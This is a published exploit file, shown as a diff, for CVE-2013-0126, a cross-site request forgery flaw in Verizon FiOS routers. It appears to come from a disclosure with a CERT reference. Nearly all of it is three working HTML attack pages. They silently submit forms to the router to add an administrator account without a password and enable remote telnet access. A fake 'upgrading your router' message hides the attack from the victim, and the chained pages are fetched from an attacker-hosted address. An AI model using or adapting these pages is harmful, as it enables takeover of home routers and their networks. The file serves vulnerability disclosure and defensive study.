@@ -1,0 +1,101 @@
+# Exploit Title: Verizon Fios Router CSRF Admin Shell 
+# Date: Discovered and reported January 2013
+# Author: Jacob Holcomb/Gimppy - Security Analyst @ Independent Security Evaluators
+# Software: Verizon FIOS Router - Firmware 40.19.36 (http://verizon.com)
+# CVE: CVE-2013-0126
+# Advisory/Video: http://infosec42.blogspot.com/2013/03/verizon-fios-router-csrf-cve-2013-0126.html
+
+US CERT Disclosure: http://www.kb.cert.org/vuls/id/278204
+
+Exploit Code:
+
+HTML FILE #1
+
+<html>
+<title>Cisco Verizon FIOS CSRF - Adding Administrator User</title>
+<!--Cisco Model: MI424WR-GEN3I -->
+<!--Firmware Version: 40.19.36 -->
+<h1>Please sit tight while we upgrade your router</h1>
+
+<body>
+
+<form name="verizonCisco" action="http://192.168.1.1/index.cgi" method="post">
+<input type="hidden" name="active_page" value="101"/>
+<input type="hidden" name="page_title" value="User Settings"/>
+<input type="hidden" name="mimic_button_field" value="submit_button_submit: .."/>
+<input type="hidden" name="button_value" value="."/>
+<input type="hidden" name="strip_page_top" value="0"/>
+<input type="hidden" name="user_id" value="-1"/>
+<input type="hidden" name="fullname_defval" value=""/>
+<input type="hidden" name="fullname" value="g42"/>
+<input type="hidden" name="username_defval" value=""/>
+<input type="hidden" name="username" value="G42"/>
+<input type="hidden" name="user_level" value="2"/>
+<input type="hidden" name="email_system_notify_level" value="15"/>
+<input type="hidden" name="email_security_notify_level" value="15"/>
+</form>
+
+<script>
+function CSRF1() {window.open("http://10.0.1.101/verizonFIOS2.html");};window.setTimeout(CSRF1,1000)
+function CSRF2() {document.verizonCisco.submit();};window.setTimeout(CSRF2,1000)
+</script>
+
+</body>
+</html>
+
+HTML FILE #2
+
+<html>
+<title>Cisco Verizon FIOS CSRF2 - Add User w/ No Pass Confirmation</title>
+
+<body>
+
+<form name="verizonCiscoC" action="http://192.168.1.1/index.cgi" method="post">
+<input type="hidden" name="active_page" value="101"/>
+<input type="hidden" name="page_title" value="User Settings"/>
+<input type="hidden" name="mimic_button_field" value="submit_button_confirm_submit: .."/>
+<input type="hidden" name="button_value" value="."/>
+<input type="hidden" name="strip_page_top" value="0"/>
+</form>
+
+<script>
+function CSRF1() {window.open("http://10.0.1.101/verizonFIOS3.html");};window.setTimeout(CSRF1,0500)
+function CSRF2() {document.verizonCiscoC.submit();};window.setTimeout(CSRF2,0500)
+</script>
+
+</body>
+</html>
+
+HTML FILE #3
+
+ <html>
+<title>Cisco Verizon FIOS CSRF3 - Enable Remote Administration</title>
+
+<body>
+
+<form name="verizonCiscoRemote" action="http://192.168.1.1/index.cgi" method="post">
+<input type="hidden" name="active_page" value="9078"/>
+<input type="hidden" name="active_page_str" value="page_remote_admin"/>
+<input type="hidden" name="page_title" value="Remote Administration"/>
+<input type="hidden" name="mimic_button_field" value="submit_button_submit: .."/>
+<input type="hidden" name="button_value" value=""/>
+<input type="hidden" name="strip_page_top" value="0"/>
+<input type="hidden" name="is_telnet_primary" value="1"/>
+<input type="hidden" name="is_telnet_primary_defval" value="0"/>
+<input type="hidden" name="is_telnet_secondary_defval" value="0"/>
+<input type="hidden" name="is_telnet_ssl_defval" value="0"/>
+<input type="hidden" name="is_http_primary_defval" value="0"/>
+<input type="hidden" name="is_http_secondary_defval" value="0"/>
+<input type="hidden" name="is_https_primary_defval" value="0"/>
+<input type="hidden" name="is_https_secondary_defval" value="0"/>
+<input type="hidden" name="is_diagnostics_icmp_defval" value="0"/>
+<input type="hidden" name="is_diagnostics_traceroute_defval" value="0"/>
+<input type="hidden" name="is_telnet_secondary" value="1"/>
+</form>
+
+<script>
+function CSRF1() {document.verizonCiscoRemote.submit();};window.setTimeout(CSRF1,0000)
+</script>
+
+</body>
+</html>
